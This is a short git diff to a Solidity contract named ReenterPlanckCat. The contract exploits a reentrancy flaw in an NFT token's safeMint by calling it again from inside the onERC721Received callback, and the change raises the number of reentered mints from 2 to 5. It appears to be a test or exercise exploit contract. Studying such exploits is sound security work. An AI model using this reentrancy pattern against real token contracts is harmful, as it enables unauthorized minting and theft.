@@ -3,7 +3,7 @@ pragma solidity ^0.8.2;
 
 import "@openzeppelin/contracts/token/ERC721/utils/ERC721Holder.sol";
 import "@openzeppelin/contracts/utils/Counters.sol";
-import "./interfaces/IPlanckCat.sol";
+import "../interfaces/IPlanckCat.sol";
 
 contract ReenterPlanckCat is ERC721Holder {
     using Counters for Counters.Counter;
@@ -27,9 +27,9 @@ contract ReenterPlanckCat is ERC721Holder {
         uint256,
         bytes memory
     ) public virtual override returns (bytes4) {
-        /// Can mint infinite cats on re-entering. So limiting to 2.
+        /// Can mint infinite cats on re-entering. So limiting to 5.
         _tokenIdCounter.increment();
-        if (_tokenIdCounter.current() == 2) {
+        if (_tokenIdCounter.current() == 5) {
             return this.onERC721Received.selector;
         }
         IPlanckCat(pcd).safeMint(address(this));
